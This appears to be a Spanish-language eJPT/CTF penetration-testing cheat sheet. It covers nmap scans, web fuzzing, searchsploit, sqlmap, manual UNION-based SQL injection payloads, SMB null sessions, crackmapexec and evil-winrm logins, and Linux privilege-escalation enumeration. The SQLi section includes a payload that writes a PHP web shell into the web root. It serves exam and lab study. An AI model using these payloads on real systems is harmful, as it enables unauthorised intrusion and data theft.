# Exam-eJPT-Cheatsheet
Ayuda de algunos comandos que pueden utilizarse en el eJPT o en algun CTF.

## Common ports
| Port | Protocol | Hint                   |
|------|----------|------------------------|
| 22   | SSH      |                        |
| 25   | SMTP     |                        |
| 110  | POP3     |                        |
| 115  | SFTP     |                        |
| 143  | IMAP     |                        |
| 80   | HTTP     |                        |
| 443  | HTTPS    |                        |
| 23   | TELNET   |                        |
| 21   | FTP      |                        |
| 3389 | RDP      |                        |
| 3306 | MYSQL    |                        |
| 1433 | MS SQL   |                        |
| 137  | NETBIOS  | find work groups       |
| 138  | NETBIOS  | list shares & machines |
| 139  | NETBIOS  | transit data           |
| 53   | DNS      |                        |

### Nmap Scans
#### OS Detection
    nmap -Pn -O <IP>
#### Nmap Scan ports
    nmap -p- --open -T5 -n <IP> -oG allPorts
    nmap -p- --open -sS --min-rate 5000 -n -Pn <IP> -oN allPorts (Rapido)
#### Nmap Scan Scripts reconocimiento.
    nmap -sC -sV -p<ports> 10.10.10.10 -oN target
#### Nmap Scan (UDP Quick)
    nmap -sU -sV <IP> 
#### Other nmap scan useful during exam
    nmap -sV -Pn -T4 -A -p- -iL hosts.nmap -oN ports.nmap
    nmap --script vuln --script-args=unsafe=1 -iL hosts.nmap
# FUZZING
## mi herramienta favorita para hacer fuzzing  es wfuzz pero existen otras que podemos utilizar.
    wfuzz -c --hc=404,400 -w <dictionaryFile> http://<IP>/FUZZ
#### subdominios pordemos usa el -Z en wfuzz
    wfuzz -c --hc=404,400 -Z -w <dictionaryFile> http://<IP>/FUZZ
#### Herramientas dirsearch , dirb podemos usar tambien gobuster
    dirsearch.py [-u|--url] target [-e|--extensions] extensions [options]
    dirb http://<IP>
# Buscar exploits
### Sabemos que para buscar vulnerabilidades podemos usar google u tirar de esta  herramienta llamada searchsploit
#### Busqueda 
    searchsploit <Name>
#### Inspeccionar
    searchsploit -x path : example searchsploit -x linux_x86-64/47151.c
#### copiar exploit
    searchsploit -m path : example searchsploit -m linux_x86-64/47151.c
# SQLi
### SQLMap
### Podemos tirar de esta herramienta para las injecciones SQL , pero dejare un pequeño recurso para hacerlo manualmente.
    sqlmap -u http://<IP> -p parameter
    sqlmap -u http://<IP>  --data POSTstring -p parameter
    sqlmap -u http://<IP> --os-shell
    sqlmap -u http://<IP> --dump
### Recurso 
https://cheatsheet.haax.fr/web-pentest/injections/server-side-injections/sql/
### Sentencias comunes SQLi
#### Probar si nos lanza algun error
    '
    ' Order by 1000 : tratar de ordenar datos.
    ' Union Select 1 : esperar las columnas.
    ' Union Select "test" : esperar las columnas.
#### Obtener nombre de la DB
    ' Union Select database() -- -
    ' Union select schema_name from information_schema.schemata -- -
#### Tablas
    ' Union select table_name from information_schema.tables where table_schema="nameDB" -- -
#### Columnas
    ' Union Select column_name from information_schema.columns where table_schema="nameDB" and table_name="nameTable" -- -
#### Data extract
    ' Union select group_concat(column1,...,coluumnN) from <tablenale> -- -
#### Upload file or Create content
    ' Union Select "Probando" into outfile "/var/www/html/prueba.txt" -- -
#### PHP with SQLi
    'Union Select "<?php system($_GET['cmd'];?>" into outfile "/var/www/html/commandExec.php" -- -
    
### Windows Shares Using Null sessions
    nmblookup -A <IP>
    smbclient -L //<IP> -N (list shares)
    smbclient //<IP>/share -N (mount share)
    smbclient -L <IP> -N --option="client min protocol=NT1"
    enum4linux -a <IP>
### Windows machines
    crackmapexec smb <IP> -u 'user' -p 'password' : Si esto nos contesta con un [+] el usuario es valido
    crackmapexec winrm <IP> -u 'user' -p 'password' : si esto nos pone un Pwn3d podemos conectanos con evilwinrm
    evil-winrm -i <IP> -u 'user' -p 'pass'
### Escalar privilegios Linux
#### Podemos tratar de escalar privilegios buscando e inspeccionando con estos comandos.
#### SUID
    find / -perm -4000 2>/dev/null
#### SUDOERS
    sudo -l
#### Capabilities
    getcap -r / 2>/dev/null
#### Si no encontramos por aqui algo importante podemos empezar a enumerar el sistema con otras tecnicas como buscar tareas cron , linpeas.sh o tratar de revisar que archivos podemos editar nosotros con el siguiente comando
    find / -user <user> 2>/dev/null
#### Podemos quitar los proc
    find / -user <user> 2>/dev/null | grep -vE "proc|/proc"
    
